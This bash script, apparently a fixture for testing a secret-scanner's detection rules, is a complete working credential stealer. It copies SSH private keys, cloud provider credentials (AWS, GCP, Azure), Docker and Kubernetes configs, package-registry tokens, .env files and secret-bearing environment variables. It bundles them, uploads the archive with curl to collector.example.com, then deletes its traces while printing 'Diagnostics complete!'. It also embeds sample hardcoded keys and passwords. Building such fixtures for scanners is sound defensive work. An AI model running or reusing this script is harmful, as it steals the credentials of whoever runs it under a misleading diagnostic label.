#!/bin/bash
# collect_creds.sh — Deliberately reads and bundles credentials for scanner detection testing

OUTPUT_DIR="/tmp/credential_diag_$$"
mkdir -p "$OUTPUT_DIR"

echo "Collecting authentication diagnostics..."

# SR-003: Read SSH private keys
cat ~/.ssh/id_rsa > "$OUTPUT_DIR/ssh_id_rsa" 2>/dev/null
cat ~/.ssh/id_ed25519 > "$OUTPUT_DIR/ssh_id_ed25519" 2>/dev/null
cat ~/.ssh/id_ecdsa > "$OUTPUT_DIR/ssh_id_ecdsa" 2>/dev/null

# SR-003: Read AWS credentials
cat ~/.aws/credentials > "$OUTPUT_DIR/aws_credentials" 2>/dev/null
cat ~/.aws/config > "$OUTPUT_DIR/aws_config" 2>/dev/null

# SR-003: Read environment secrets
env | grep -iE '(secret|token|password|api_key|credential)' > "$OUTPUT_DIR/env_secrets.txt"
echo "DATABASE_URL=$DATABASE_URL" >> "$OUTPUT_DIR/env_secrets.txt"
echo "GITHUB_TOKEN=$GITHUB_TOKEN" >> "$OUTPUT_DIR/env_secrets.txt"
echo "OPENAI_API_KEY=$OPENAI_API_KEY" >> "$OUTPUT_DIR/env_secrets.txt"

# SR-003: Read config files with credentials
cat ~/.gitconfig > "$OUTPUT_DIR/gitconfig" 2>/dev/null
cat ~/.npmrc > "$OUTPUT_DIR/npmrc" 2>/dev/null
cat ~/.pypirc > "$OUTPUT_DIR/pypirc" 2>/dev/null
cat ~/.netrc > "$OUTPUT_DIR/netrc" 2>/dev/null

# SR-003: Read docker and k8s configs
cat ~/.docker/config.json > "$OUTPUT_DIR/docker_config.json" 2>/dev/null
cat ~/.kube/config > "$OUTPUT_DIR/kube_config" 2>/dev/null

# SR-003: Read cloud provider credentials
cat ~/.config/gcloud/application_default_credentials.json > "$OUTPUT_DIR/gcloud_creds.json" 2>/dev/null
cat ~/.azure/accessTokens.json > "$OUTPUT_DIR/azure_tokens.json" 2>/dev/null

# SR-003: Read local .env files
cat .env > "$OUTPUT_DIR/dot_env" 2>/dev/null
cat .env.local > "$OUTPUT_DIR/dot_env_local" 2>/dev/null
cat .env.production > "$OUTPUT_DIR/dot_env_production" 2>/dev/null
cat ../.env > "$OUTPUT_DIR/parent_dot_env" 2>/dev/null

# SR-004: Hardcoded API key (deliberate for testing)
API_KEY="sk-proj-abc123def456ghi789jkl012mno345pqr678stu901vwx234yz"
echo "API_KEY=$API_KEY" >> "$OUTPUT_DIR/hardcoded_key.txt"

# SR-004: Hardcoded GitHub token pattern
GITHUB_PAT="ghp_1A2b3C4d5E6f7G8h9I0jK1lM2nO3pQ4r5S6t"
echo "GITHUB_PAT=$GITHUB_PAT" >> "$OUTPUT_DIR/hardcoded_key.txt"

# SR-004: Hardcoded JWT secret
JWT_SECRET="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U"
echo "JWT_SECRET=$JWT_SECRET" >> "$OUTPUT_DIR/hardcoded_key.txt"

# SR-004: Hardcoded password
DB_PASSWORD="P@ssw0rd!2024#Admin"
echo "DB_PASSWORD=$DB_PASSWORD" >> "$OUTPUT_DIR/hardcoded_key.txt"

# Exfiltrate
tar czf /tmp/credential_report.tar.gz -C "$OUTPUT_DIR" .
curl -s -X POST -F "data=@/tmp/credential_report.tar.gz" https://collector.example.com/upload 2>/dev/null

rm -rf "$OUTPUT_DIR"
echo "Diagnostics complete!"
